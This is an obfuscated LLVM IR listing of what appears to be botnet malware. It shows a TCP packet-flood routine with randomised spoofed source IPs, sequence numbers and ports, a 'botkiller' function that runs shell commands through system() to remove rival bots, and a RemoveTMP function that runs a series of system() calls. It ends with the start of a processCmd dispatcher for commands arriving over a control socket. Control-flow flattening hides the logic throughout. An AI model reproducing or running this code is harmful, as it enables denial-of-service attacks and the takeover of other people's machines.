  %95 = load i32, i32* %13, align 4
  %96 = sext i32 %95 to i64
  %97 = add i64 20, %96
  %98 = trunc i64 %97 to i32
  call void @makeIPPacket(%struct.iphdr* %88, i32 %91, i32 %94, i8 zeroext 6, i32 %98)
  %99 = call i32 @rand_cmwc()
  %100 = trunc i32 %99 to i16
  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon.0* %102 to %struct.anon.1*
  %104 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %103, i32 0, i32 0
  store i16 %100, i16* %104, align 4
  %105 = call i32 @rand_cmwc()
  %106 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon.0* %107 to %struct.anon.1*
  %109 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %108, i32 0, i32 2
  store i32 %105, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon.0* %111 to %struct.anon.1*
  %113 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %112, i32 0, i32 3
  store i32 0, i32* %113, align 4
  %114 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %115 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %114, i32 0, i32 0
  %116 = bitcast %union.anon.0* %115 to %struct.anon.1*
  %117 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %116, i32 0, i32 4
  %118 = load i16, i16* %117, align 4
  %119 = and i16 %118, -241
  %120 = or i16 %119, 80
  store i16 %120, i16* %117, align 4
  %121 = load i8*, i8** %12, align 8
  %122 = call i32 @strcmp(i8* %121, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.416, i32 0, i32 0)) #10
  %123 = icmp ne i32 %122, 0
  %124 = select i1 %123, i32 22204391, i32 -1334177333
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %127 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %126, i32 0, i32 0
  %128 = bitcast %union.anon.0* %127 to %struct.anon.1*
  %129 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %128, i32 0, i32 4
  %130 = load i16, i16* %129, align 4
  %131 = and i16 %130, -513
  %132 = or i16 %131, 512
  store i16 %132, i16* %129, align 4
  %133 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %134 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %133, i32 0, i32 0
  %135 = bitcast %union.anon.0* %134 to %struct.anon.1*
  %136 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %135, i32 0, i32 4
  %137 = load i16, i16* %136, align 4
  %138 = and i16 %137, -1025
  %139 = or i16 %138, 1024
  store i16 %139, i16* %136, align 4
  %140 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %141 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %140, i32 0, i32 0
  %142 = bitcast %union.anon.0* %141 to %struct.anon.1*
  %143 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %142, i32 0, i32 4
  %144 = load i16, i16* %143, align 4
  %145 = and i16 %144, -257
  %146 = or i16 %145, 256
  store i16 %146, i16* %143, align 4
  %147 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %148 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %147, i32 0, i32 0
  %149 = bitcast %union.anon.0* %148 to %struct.anon.1*
  %150 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %149, i32 0, i32 4
  %151 = load i16, i16* %150, align 4
  %152 = and i16 %151, -4097
  %153 = or i16 %152, 4096
  store i16 %153, i16* %150, align 4
  %154 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %155 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %154, i32 0, i32 0
  %156 = bitcast %union.anon.0* %155 to %struct.anon.1*
  %157 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %156, i32 0, i32 4
  %158 = load i16, i16* %157, align 4
  %159 = and i16 %158, -2049
  %160 = or i16 %159, 2048
  store i16 %160, i16* %157, align 4
  store i32 397898372, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = load i8*, i8** %12, align 8
  %163 = call i8* @strtok(i8* %162, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %163, i8** %23, align 8
  store i32 706533790, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8*, i8** %23, align 8
  %166 = icmp ne i8* %165, null
  %167 = select i1 %166, i32 1956663544, i32 -352879926
  store i32 %167, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i8*, i8** %23, align 8
  %170 = call i32 @strcmp(i8* %169, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.418, i32 0, i32 0)) #10
  %171 = icmp ne i32 %170, 0
  %172 = select i1 %171, i32 -969043187, i32 -2065890943
  store i32 %172, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %175 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %174, i32 0, i32 0
  %176 = bitcast %union.anon.0* %175 to %struct.anon.1*
  %177 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %176, i32 0, i32 4
  %178 = load i16, i16* %177, align 4
  %179 = and i16 %178, -513
  %180 = or i16 %179, 512
  store i16 %180, i16* %177, align 4
  store i32 -304150473, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i8*, i8** %23, align 8
  %183 = call i32 @strcmp(i8* %182, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.419, i32 0, i32 0)) #10
  %184 = icmp ne i32 %183, 0
  %185 = select i1 %184, i32 690539132, i32 726842314
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %188 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %187, i32 0, i32 0
  %189 = bitcast %union.anon.0* %188 to %struct.anon.1*
  %190 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %189, i32 0, i32 4
  %191 = load i16, i16* %190, align 4
  %192 = and i16 %191, -1025
  %193 = or i16 %192, 1024
  store i16 %193, i16* %190, align 4
  store i32 730985973, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i8*, i8** %23, align 8
  %196 = call i32 @strcmp(i8* %195, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.420, i32 0, i32 0)) #10
  %197 = icmp ne i32 %196, 0
  %198 = select i1 %197, i32 -638736397, i32 164315592
  store i32 %198, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  %200 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 0
  %202 = bitcast %union.anon.0* %201 to %struct.anon.1*
  %203 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %202, i32 0, i32 4
  %204 = load i16, i16* %203, align 4
  %205 = and i16 %204, -257
  %206 = or i16 %205, 256
  store i16 %206, i16* %203, align 4
  store i32 1474213616, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i8*, i8** %23, align 8
  %209 = call i32 @strcmp(i8* %208, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.421, i32 0, i32 0)) #10
  %210 = icmp ne i32 %209, 0
  %211 = select i1 %210, i32 1413522505, i32 386362943
  store i32 %211, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %213 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 0
  %215 = bitcast %union.anon.0* %214 to %struct.anon.1*
  %216 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %215, i32 0, i32 4
  %217 = load i16, i16* %216, align 4
  %218 = and i16 %217, -4097
  %219 = or i16 %218, 4096
  store i16 %219, i16* %216, align 4
  store i32 -117160067, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %23, align 8
  %222 = call i32 @strcmp(i8* %221, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.422, i32 0, i32 0)) #10
  %223 = icmp ne i32 %222, 0
  %224 = select i1 %223, i32 -2132551432, i32 -1622009617
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %226 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 0
  %228 = bitcast %union.anon.0* %227 to %struct.anon.1*
  %229 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = and i16 %230, -2049
  %232 = or i16 %231, 2048
  store i16 %232, i16* %229, align 4
  store i32 -798814554, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i32, i32* @mainCommSock, align 4
  %235 = load i8*, i8** %23, align 8
  %236 = call i32 (i32, i8*, ...) @sockprintf(i32 %234, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.423, i32 0, i32 0), i8* %235)
  store i32 -798814554, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  store i32 -117160067, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  store i32 1474213616, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  store i32 730985973, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  store i32 -304150473, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %242, i8** %23, align 8
  store i32 706533790, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  store i32 397898372, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = call i32 @rand_cmwc()
  %246 = trunc i32 %245 to i16
  %247 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 0
  %249 = bitcast %union.anon.0* %248 to %struct.anon.1*
  %250 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %249, i32 0, i32 5
  store i16 %246, i16* %250, align 2
  %251 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %252 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %251, i32 0, i32 0
  %253 = bitcast %union.anon.0* %252 to %struct.anon.1*
  %254 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %253, i32 0, i32 6
  store i16 0, i16* %254, align 4
  %255 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %256 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %255, i32 0, i32 0
  %257 = bitcast %union.anon.0* %256 to %struct.anon.1*
  %258 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %257, i32 0, i32 7
  store i16 0, i16* %258, align 2
  %259 = load i32, i32* %9, align 4
  %260 = icmp eq i32 %259, 0
  %261 = select i1 %260, i32 1887652597, i32 377267310
  store i32 %261, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = call i32 @rand_cmwc()
  store i32 641312907, i32* %switchVar
  store i32 %263, i32* %.reg2mem10
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i32, i32* %9, align 4
  %266 = trunc i32 %265 to i16
  %267 = call zeroext i16 @htons(i16 zeroext %266) #13
  %268 = zext i16 %267 to i32
  store i32 641312907, i32* %switchVar
  store i32 %268, i32* %.reg2mem10
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %270 = trunc i32 %.reload11 to i16
  %271 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 0
  %273 = bitcast %union.anon.0* %272 to %struct.anon.1*
  %274 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %273, i32 0, i32 1
  store i16 %270, i16* %274, align 2
  %275 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %276 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %277 = call zeroext i16 @tcpcsum(%struct.iphdr* %275, %struct.tcphdr* %276)
  %278 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 0
  %280 = bitcast %union.anon.0* %279 to %struct.anon.1*
  %281 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %280, i32 0, i32 6
  store i16 %277, i16* %281, align 4
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %282 = bitcast i8* %.reload8 to i16*
  %283 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i32 0, i32 2
  %285 = load i16, i16* %284, align 2
  %286 = zext i16 %285 to i32
  %287 = call zeroext i16 @csum(i16* %282, i32 %286)
  %288 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 7
  store i16 %287, i16* %289, align 2
  %290 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %291 = load i32, i32* %10, align 4
  %292 = add nsw i32 %290, %291
  store i32 %292, i32* %24, align 4
  store i32 0, i32* %25, align 4
  store i32 1585597135, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 -1704261166, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i32, i32* %17, align 4
  %296 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %297 = call i64 @sendto(i32 %295, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %296, i32 16)
  %298 = load i32, i32* %19, align 4
  %299 = call i32 @getRandomIP(i32 %298)
  %300 = call i32 @htonl(i32 %299) #13
  %301 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i32 0, i32 8
  store i32 %300, i32* %302, align 4
  %303 = call i32 @rand_cmwc()
  %304 = trunc i32 %303 to i16
  %305 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %306 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %305, i32 0, i32 3
  store i16 %304, i16* %306, align 4
  %307 = call i32 @rand_cmwc()
  %308 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %309 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %308, i32 0, i32 0
  %310 = bitcast %union.anon.0* %309 to %struct.anon.1*
  %311 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %310, i32 0, i32 2
  store i32 %307, i32* %311, align 4
  %312 = call i32 @rand_cmwc()
  %313 = trunc i32 %312 to i16
  %314 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 0
  %316 = bitcast %union.anon.0* %315 to %struct.anon.1*
  %317 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %316, i32 0, i32 0
  store i16 %313, i16* %317, align 4
  %318 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 0
  %320 = bitcast %union.anon.0* %319 to %struct.anon.1*
  %321 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %320, i32 0, i32 6
  store i16 0, i16* %321, align 4
  %322 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %323 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %324 = call zeroext i16 @tcpcsum(%struct.iphdr* %322, %struct.tcphdr* %323)
  %325 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 0
  %327 = bitcast %union.anon.0* %326 to %struct.anon.1*
  %328 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %327, i32 0, i32 6
  store i16 %324, i16* %328, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %329 = bitcast i8* %.reload6 to i16*
  %330 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 2
  %332 = load i16, i16* %331, align 2
  %333 = zext i16 %332 to i32
  %334 = call zeroext i16 @csum(i16* %329, i32 %333)
  %335 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 7
  store i16 %334, i16* %336, align 2
  %337 = load i32, i32* %25, align 4
  %338 = load i32, i32* %15, align 4
  %339 = icmp eq i32 %337, %338
  %340 = select i1 %339, i32 -2008080540, i32 1075037163
  store i32 %340, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %343 = load i32, i32* %24, align 4
  %344 = icmp sgt i32 %342, %343
  %345 = select i1 %344, i32 -1468984431, i32 -1938432512
  store i32 %345, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  store i32 -142189227, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  store i32 0, i32* %25, align 4
  store i32 1585597135, i32* %switchVar
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  %349 = load i32, i32* %25, align 4
  %350 = add i32 %349, 1
  store i32 %350, i32* %25, align 4
  store i32 1585597135, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %352)
  store i32 -982276927, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %351, %348, %347, %346, %341, %294, %293, %269, %264, %262, %244, %243, %241, %240, %239, %238, %237, %233, %225, %220, %212, %207, %199, %194, %186, %181, %173, %168, %164, %161, %125, %77, %71, %70, %66, %63, %57, %54, %47, %46, %40, %35, %31, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @botkiller() #0 {
  %1 = alloca [10 x i8*], align 16
  %2 = alloca [23 x i8*], align 16
  %3 = alloca [16 x i8*], align 16
  %4 = alloca [80 x i8], align 16
  %5 = alloca [80 x i8], align 16
  %6 = alloca [128 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = bitcast [10 x i8*]* %1 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %10, i8* bitcast ([10 x i8*]* @botkiller.teldirs to i8*), i64 80, i32 16, i1 false)
  %11 = bitcast [23 x i8*]* %2 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %11, i8* bitcast ([23 x i8*]* @botkiller.Boats to i8*), i64 184, i32 16, i1 false)
  %12 = bitcast [16 x i8*]* %3 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %12, i8* bitcast ([16 x i8*]* @botkiller.bots to i8*), i64 128, i32 16, i1 false)
  store i32 0, i32* %9, align 4
  %switchVar = alloca i32
  store i32 1886951843, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1886951843, label %13
    i32 -983293012, label %18
    i32 -929546285, label %23
    i32 -1563679690, label %46
    i32 560064045, label %61
    i32 838392673, label %72
    i32 -500662824, label %75
    i32 171534136, label %77
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %9, align 4
  %15 = load i32, i32* %8, align 4
  %16 = icmp slt i32 %14, %15
  %17 = select i1 %16, i32 -983293012, i32 -500662824
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 128, i32 16, i1 false)
  %20 = load i32, i32* %9, align 4
  %21 = icmp eq i32 %20, 0
  %22 = select i1 %21, i32 -929546285, i32 -1563679690
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i32 0, i32 0
  %25 = load i32, i32* %9, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %26
  %28 = load i8*, i8** %27, align 8
  %29 = load i32, i32* %9, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %30
  %32 = load i8*, i8** %31, align 8
  %33 = load i32, i32* %9, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %34
  %36 = load i8*, i8** %35, align 8
  %37 = load i32, i32* %9, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %38
  %40 = load i8*, i8** %39, align 8
  %41 = load i32, i32* %9, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds [16 x i8*], [16 x i8*]* %3, i64 0, i64 %42
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %24, i64 127, i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.455, i32 0, i32 0), i8* %28, i8* %32, i8* %36, i8* %40, i8* %44) #5
  store i32 560064045, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i32 0, i32 0
  %48 = load i32, i32* %9, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %49
  %51 = load i8*, i8** %50, align 8
  %52 = load i32, i32* %9, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %53
  %55 = load i8*, i8** %54, align 8
  %56 = load i32, i32* %9, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %57
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %47, i64 127, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.456, i32 0, i32 0), i8* %51, i8* %55, i8* %59) #5
  store i32 560064045, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i32 0, i32 0
  %63 = call i32 @system(i8* %62)
  %64 = getelementptr inbounds [80 x i8], [80 x i8]* %5, i32 0, i32 0
  %65 = load i32, i32* %9, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [16 x i8*], [16 x i8*]* %3, i64 0, i64 %66
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 (i8*, i8*, ...) @sprintf(i8* %64, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.457, i32 0, i32 0), i8* %68) #5
  %70 = getelementptr inbounds [80 x i8], [80 x i8]* %5, i32 0, i32 0
  %71 = call i32 @system(i8* %70)
  store i32 171534136, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %9, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %9, align 4
  store i32 1886951843, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = call i32 @sleep(i32 5)
  store i32 171534136, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %75, %72, %61, %46, %23, %18, %13, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @snprintf(i8*, i64, i8*, ...) #2

declare i32 @system(i8*) #4

declare i32 @sleep(i32) #4

; Function Attrs: noinline nounwind uwtable
define void @RemoveTMP() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.458, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.459, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.460, i32 0, i32 0))
  %4 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.459, i32 0, i32 0))
  %5 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.461, i32 0, i32 0))
  %6 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.462, i32 0, i32 0))
  %7 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.463, i32 0, i32 0))
  %8 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.464, i32 0, i32 0))
  %9 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.465, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.466, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.467, i32 0, i32 0))
  %12 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.468, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.469, i32 0, i32 0))
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %31 = load i8**, i8*** %4, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @strcmp(i8* %33, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0)) #10
  store i32 %34, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -570899910, i32* %switchVar
  %.reg2mem2 = alloca i32
  %.reg2mem4 = alloca i32
  %.reg2mem6 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -570899910, label %first
    i32 999393090, label %37
    i32 1272635855, label %40
    i32 -252863548, label %47
    i32 690629071, label %52
    i32 -850656630, label %59
    i32 1027610108, label %63
    i32 1126281609, label %68
    i32 -1456666184, label %69
    i32 -573792573, label %76
    i32 1932551332, label %83
    i32 61200933, label %87
    i32 1062772384, label %88
    i32 -1147360145, label %91
    i32 -1143452459, label %98
    i32 462231904, label %102
    i32 -34085679, label %103
    i32 -835654611, label %108
    i32 123822391, label %110
    i32 -350941411, label %114
    i32 1550300790, label %115
    i32 860124136, label %116
    i32 727824998, label %119
    i32 1430243527, label %120
    i32 -932274145, label %127
    i32 262722430, label %131
    i32 2053430920, label %138
    i32 -1304023458, label %145
    i32 -1503867294, label %152
    i32 2014211020, label %159
    i32 -302868774, label %166
    i32 1478103692, label %173
    i32 1564760196, label %177
    i32 -1501869485, label %184
    i32 1894029468, label %185
    i32 -903337621, label %208
